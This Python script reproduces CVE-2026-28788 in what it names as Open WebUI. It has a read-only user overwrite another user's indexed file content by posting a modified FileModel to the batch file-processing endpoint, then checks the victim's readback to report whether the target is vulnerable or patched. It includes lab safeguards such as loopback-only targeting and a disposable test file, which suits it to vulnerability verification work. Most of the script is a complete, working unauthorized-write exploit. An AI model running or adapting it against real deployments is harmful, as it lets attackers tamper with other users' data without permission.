#!/usr/bin/env python3
"""
CVE-2026-28788 Direct HTTP Exploit Reproduction Script.
Exercises unauthorized file overwrite via POST /api/v1/retrieval/process/files/batch.
Verifies whether Bob (with read-only access to Alice's shared KB) can overwrite
Alice's file indexed text content (File.data.content).
"""

import argparse
import copy
import hashlib
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Dict, Optional
import urllib.request
import urllib.error

SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

from lab_safety import validate_setup_file, verify_setup_target


def http_request(
    url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    data: Optional[bytes] = None,
    timeout: int = 15,
) -> Dict[str, Any]:
    req = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8")
            status_code = resp.status
            try:
                parsed = json.loads(body)
            except Exception:
                parsed = {"raw": body}
            return {"status_code": status_code, "data": parsed, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            parsed = json.loads(body)
        except Exception:
            parsed = {"raw": body}
        return {"status_code": e.code, "data": parsed, "error": str(e)}
    except Exception as e:
        return {"status_code": 0, "data": None, "error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="Reproduce CVE-2026-28788 via direct HTTP calls")
    parser.add_argument("--setup-file", required=True, help="Path to setup JSON generated by setup_lab.py")
    parser.add_argument("--output", default=None, help="Path to write reproduction report JSON")
    parser.add_argument(
        "--allow-non-loopback", action="store_true",
        help="DANGEROUS: explicitly permit a non-loopback disposable lab target",
    )
    args = parser.parse_args()

    try:
        setup_data = validate_setup_file(args.setup_file, allow_non_loopback=args.allow_non_loopback)
        verify_setup_target(
            setup_data,
            http_request,
            allow_non_loopback=args.allow_non_loopback,
            require_baseline=True,
        )
    except Exception as exc:
        print(f"Lab preflight failed; no reproduction request was sent: {exc}", file=sys.stderr)
        sys.exit(2)
    if args.allow_non_loopback:
        print("WARNING: NON-LOOPBACK DESTRUCTIVE REPRODUCTION ENABLED", file=sys.stderr)

    base_url = setup_data["base_url"]
    alice_token = setup_data["alice"]["token"]
    alice_user_id = setup_data["alice"]["user_id"]
    bob_token = setup_data["bob"]["token"]
    bob_user_id = setup_data["bob"]["user_id"]
    kb_id = setup_data["knowledge_base"]["id"]
    file_id = setup_data["disposable_file"]["id"]

    script_dir = Path(__file__).resolve().parent
    lab_dir = script_dir.parent
    fixtures_dir = lab_dir / "fixtures"

    marker_path = fixtures_dir / "attacker_marker.txt"
    if marker_path.exists():
        attacker_marker = marker_path.read_text(encoding="utf-8").strip()
    else:
        attacker_marker = "EXPLOIT_TRACER_CVE_2026_28788_CONFIRMED"

    print(f"=== Running CVE-2026-28788 Reproduction against {base_url} ===")
    print(f"Target File ID: {file_id}")
    print(f"Alice (Victim User ID): {alice_user_id}")
    print(f"Bob (Attacker User ID): {bob_user_id}")
    print(f"Shared Knowledge Base ID: {kb_id}")
    print(f"Attacker Marker: {attacker_marker[:30]}...")

    # Step 1: Alice Baseline Readback
    print("\n[Step 1] Alice Baseline Readback from /api/v1/files/{file_id}/data/content...")
    alice_headers = {"Authorization": f"Bearer {alice_token}"}
    baseline_res = http_request(
        f"{base_url}/api/v1/files/{file_id}/data/content",
        headers=alice_headers,
    )
    if baseline_res["status_code"] != 200:
        print(f"  ✗ Failed baseline readback: {baseline_res}")
        report = {
            "verdict": "INCONCLUSIVE",
            "reason": "Baseline readback failed",
            "baseline_response": baseline_res,
        }
        if args.output:
            Path(args.output).write_text(json.dumps(report, indent=2), encoding="utf-8")
        sys.exit(1)

    baseline_content = ""
    if isinstance(baseline_res["data"], dict):
        baseline_content = baseline_res["data"].get("content", "")
    elif isinstance(baseline_res["data"], str):
        baseline_content = baseline_res["data"]
    print(f"  ✓ Alice baseline readback successful (Length: {len(baseline_content)})")

    # Step 2: Bob fetches FileModel from /api/v1/files/{file_id}
    print("\n[Step 2] Bob fetches FileModel from /api/v1/files/{file_id}...")
    bob_headers = {
        "Authorization": f"Bearer {bob_token}",
        "Content-Type": "application/json",
    }
    file_meta_res = http_request(f"{base_url}/api/v1/files/{file_id}", headers=bob_headers)
    if file_meta_res["status_code"] != 200 or not isinstance(file_meta_res["data"], dict):
        print(f"  ✗ Bob failed to fetch file metadata: {file_meta_res}")
        report = {
            "verdict": "INCONCLUSIVE",
            "reason": "Attacker could not read target file metadata",
            "metadata_response": file_meta_res,
        }
        if args.output:
            Path(args.output).write_text(json.dumps(report, indent=2), encoding="utf-8")
        sys.exit(1)

    file_model = copy.deepcopy(file_meta_res["data"])
    file_owner = file_model.get("user_id")
    print(f"  ✓ FileModel retrieved (Owner user_id: {file_owner})")
    if file_owner != alice_user_id:
        print(f"  ✗ Target file owner ({file_owner}) does not match Alice ({alice_user_id})")
        report = {
            "verdict": "INCONCLUSIVE",
            "reason": f"Target file owner mismatch: expected {alice_user_id}, got {file_owner}",
        }
        if args.output:
            Path(args.output).write_text(json.dumps(report, indent=2), encoding="utf-8")
        sys.exit(1)

    # Step 3: Bob crafts and submits BatchProcessFilesForm
    print("\n[Step 3] Bob crafts BatchProcessFilesForm and submits overwrite...")
    if "data" not in file_model or not isinstance(file_model["data"], dict):
        file_model["data"] = {}
    file_model["data"]["content"] = attacker_marker

    batch_payload = {
        "files": [file_model],
        "collection_name": kb_id,
    }
    batch_bytes = json.dumps(batch_payload).encode("utf-8")

    start_time = time.time()
    batch_res = http_request(
        f"{base_url}/api/v1/retrieval/process/files/batch",
        method="POST",
        headers=bob_headers,
        data=batch_bytes,
    )
    duration_ms = int((time.time() - start_time) * 1000)
    print(f"  HTTP Status: {batch_res['status_code']} (took {duration_ms}ms)")
    print(f"  Response Body: {json.dumps(batch_res['data'])}")

    # Step 4: Alice Readback Verification with retries
    print("\n[Step 4] Alice Post-Attack Readback from /api/v1/files/{file_id}/data/content...")
    post_content = ""
    tracer_found = False
    max_retries = 5
    for attempt in range(max_retries):
        post_res = http_request(
            f"{base_url}/api/v1/files/{file_id}/data/content",
            headers=alice_headers,
        )
        if post_res["status_code"] == 200:
            if isinstance(post_res["data"], dict):
                post_content = post_res["data"].get("content", "")
            elif isinstance(post_res["data"], str):
                post_content = post_res["data"]
            if attacker_marker in post_content:
                tracer_found = True
                print(f"  ✓ Tracer FOUND in Alice's indexed content on attempt {attempt+1}!")
                break
        time.sleep(1)

    # Step 5: Verdict Analysis
    print("\n[Step 5] Analyzing outcome...")
    response_data = batch_res.get("data") or {}
    results = response_data.get("results", []) if isinstance(response_data, dict) else []
    errors = response_data.get("errors", []) if isinstance(response_data, dict) else []

    error_str = str(errors).lower()
    is_perm_denied = "permission denied" in error_str or "not file owner" in error_str

    if tracer_found and batch_res["status_code"] == 200:
        verdict = "VULNERABLE_CONFIRMED"
        reason = "Attacker Bob successfully overwritten Alice's indexed file content in shared KB without file ownership."
    elif is_perm_denied or batch_res["status_code"] in (403, 401):
        if not tracer_found and post_content == baseline_content:
            verdict = "PATCHED_CONFIRMED"
            reason = "Open WebUI enforced file ownership check on batch processing and rejected unauthorized modification."
        else:
            verdict = "INCONCLUSIVE"
            reason = "Permission error was reported but Alice's content changed or tracer was unexpectedly found."
    else:
        verdict = "INCONCLUSIVE"
        reason = f"Ambiguous response or unexpected state. Status: {batch_res['status_code']}, tracer_found: {tracer_found}"

    print(f"\n==========================================")
    print(f"REPRODUCTION VERDICT: {verdict}")
    print(f"Reason: {reason}")
    print(f"==========================================")

    report = {
        "verdict": verdict,
        "reason": reason,
        "target_url": base_url,
        "disposable_file_id": file_id,
        "kb_id": kb_id,
        "alice_user_id": alice_user_id,
        "bob_user_id": bob_user_id,
        "tracer_marker": attacker_marker,
        "tracer_found_in_readback": tracer_found,
        "http_status": batch_res["status_code"],
        "batch_response": batch_res["data"],
        "baseline_sha256": hashlib.sha256(baseline_content.encode("utf-8")).hexdigest(),
        "post_readback_sha256": hashlib.sha256(post_content.encode("utf-8")).hexdigest(),
    }

    if args.output:
        out_path = Path(args.output)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
        print(f"Detailed reproduction report written to: {out_path}")


if __name__ == "__main__":
    main()
